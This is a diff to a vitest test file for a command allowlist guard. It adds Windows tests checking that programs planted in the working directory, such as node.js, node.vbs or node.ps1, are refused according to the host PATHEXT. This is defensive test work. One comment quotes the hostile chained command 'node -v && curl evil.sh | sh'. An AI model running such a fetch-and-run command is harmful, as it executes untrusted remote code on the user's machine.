@@ -5,8 +5,15 @@
 // checked the happy first token would pass on `node -v && curl evil.sh | sh`,
 // which is the whole reason this file exists.
 
-import { describe, it, expect } from 'vitest';
-import { assertCommandAllowed, CommandNotAllowedError } from './command-allowlist';
+import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { mkdtemp, rm, writeFile } from 'node:fs/promises';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import {
+  assertCommandAllowed,
+  assertNoProgramShadowedByCwd,
+  CommandNotAllowedError,
+} from './command-allowlist';
 
 const REVIEWER = ['node', 'npx vitest', 'npx tsx'];
 
@@ -266,5 +273,99 @@ describe('assertCommandAllowed @cap:assigner-outils/moteur', () => {
     it('tolerates extra whitespace between tokens', () => {
       expect(() => assertCommandAllowed('npx   vitest   run', REVIEWER)).not.toThrow();
     });
+  });
+});
+
+// ─── Which planted file counts as a program ─────────────────────────────────
+// The belt to shellLookupHardening's braces is only as wide as the list of
+// extensions cmd.exe would append. That list is the HOST's PATHEXT, which
+// child-env.ts passes through untouched — not a list guessed once and frozen.
+
+describe('assertNoProgramShadowedByCwd @cap:assigner-outils/moteur', () => {
+  const onWindows = process.platform === 'win32';
+  const LIST = ['node'];
+  let dir: string;
+  let savedPathext: string | undefined;
+
+  beforeEach(async () => {
+    dir = await mkdtemp(join(tmpdir(), 'nodal-pathext-'));
+    savedPathext = process.env['PATHEXT'];
+  });
+
+  afterEach(async () => {
+    if (savedPathext === undefined) delete process.env['PATHEXT'];
+    else process.env['PATHEXT'] = savedPathext;
+    await rm(dir, { recursive: true, force: true });
+  });
+
+  async function plant(name: string): Promise<void> {
+    await writeFile(join(dir, name), 'planted', 'utf8');
+  }
+
+  it.runIf(onWindows)(
+    'refuses a planted node.js — cmd.exe runs .JS via the script host',
+    async () => {
+      await plant('node.js');
+      await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+        CommandNotAllowedError,
+      );
+    },
+  );
+
+  it.runIf(onWindows)('refuses a planted node.vbs', async () => {
+    await plant('node.vbs');
+    await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+      CommandNotAllowedError,
+    );
+  });
+
+  it.runIf(onWindows)('follows the HOST PATHEXT, not a frozen list', async () => {
+    // An extension no default list contains: it is refused only if the host's
+    // own PATHEXT is what the candidates are built from.
+    process.env['PATHEXT'] = '.COM;.EXE;.FOO';
+    await plant('node.foo');
+    await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+      CommandNotAllowedError,
+    );
+  });
+
+  it.runIf(onWindows)('keeps .ps1 even when the host PATHEXT omits it', async () => {
+    process.env['PATHEXT'] = '.COM;.EXE';
+    await plant('node.ps1');
+    await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+      CommandNotAllowedError,
+    );
+  });
+
+  it.runIf(onWindows)(
+    'never narrows below the Windows default, whatever PATHEXT says',
+    async () => {
+      // Not hypothetical: a vitest worker on Windows 11 runs with `.JS` missing
+      // from PATHEXT while `.JSE` is still there. Intersecting with the ambient
+      // environment would silently stop refusing a planted node.js.
+      process.env['PATHEXT'] = '.COM;.EXE';
+      await plant('node.wsf');
+      await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+        CommandNotAllowedError,
+      );
+    },
+  );
+
+  it.runIf(onWindows)('falls back to the default when PATHEXT is unset', async () => {
+    delete process.env['PATHEXT'];
+    await plant('node.vbe');
+    await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).rejects.toBeInstanceOf(
+      CommandNotAllowedError,
+    );
+  });
+
+  it.runIf(onWindows)('lets an unrelated file through', async () => {
+    await plant('readme.md');
+    await expect(assertNoProgramShadowedByCwd('node -v', LIST, dir)).resolves.toBeUndefined();
+  });
+
+  it('reads nothing and refuses nothing when no allowlist is configured', async () => {
+    await plant(process.platform === 'win32' ? 'node.cmd' : 'node');
+    await expect(assertNoProgramShadowedByCwd('node -v', null, dir)).resolves.toBeUndefined();
   });
 });
